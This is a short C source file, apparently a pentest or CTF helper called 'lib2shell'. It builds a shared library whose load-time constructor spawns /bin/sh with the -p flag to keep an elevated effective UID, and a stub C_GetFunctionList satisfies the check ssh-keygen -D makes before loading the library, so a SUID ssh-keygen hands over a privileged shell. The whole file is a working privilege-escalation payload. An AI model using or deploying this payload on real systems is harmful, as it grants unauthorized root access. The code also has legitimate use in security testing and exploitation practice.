// Author: Sean Pesce
// Modified by Jonas Heschl

#include <stdio.h>
#include <unistd.h>

#define SHELL_PATH "/bin/sh"
 
void __attribute__ ((constructor)) constructor() {
	puts("[lib2shell by SeanP, modified by Jonas Heschl]");

	// Check which effective user id the library is executed with.
	// Mostly relevant in situations where (ssh-keygen) is run with SUID set.
	printf("Current effective UID: %d\n", geteuid());

	// We need to pass -p to the shell to stop it from dropping the effective user id.
	// Not that -p is used by bash and dash (and possibly other shells) to deactivate this
	// security measure. If you want to start another shell, you might have to change this switch.
	long long err = execl(SHELL_PATH, SHELL_PATH, "-p", NULL);
	printf("Result: %lld\n", err);
}

// ssh-keygen makes a rudimentary check when loading a library with `ssh-keygen -D`.
// If the check fails, loading is aborted. This function exists to make the check pass.
int C_GetFunctionList() {
	return 1;
}

